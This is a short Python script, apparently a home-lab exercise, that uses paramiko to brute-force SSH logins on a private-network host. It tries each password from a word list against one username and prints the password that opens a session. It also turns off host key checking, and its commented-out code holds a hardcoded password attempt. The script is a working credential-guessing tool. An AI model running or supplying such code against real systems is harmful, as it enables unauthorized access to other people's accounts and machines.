import paramiko


hostname = '192.168.1.33'
port = 22
user = 'mancave'

# try:
#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#     client.connect(hostname, port= port, username= user, password='742369')
#     session = client.get_transport().open_session()
#     print(session.active)
# except:
#     print('Login Attempt Has Failed')
    

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())



with open('passwords.txt', 'r') as file:
        for passwd in file:
            # if passwd[:-1] == 'mkaek':
            #     print('True')
            #     break
            try:
                client.connect(hostname, port= port, username= user, password=passwd[:-1])
                session = client.get_transport().open_session()
                print(session.active)
                print(passwd[:-1])
                break
            except:
                print('Login Attempt Has Failed')
            
        



# with open('passwords.txt', 'r') as file:
#         for password in file:
#             if password[:-1] == 'mkaek':
#                 print('True')
#                 break
#             print(password[:-1])
        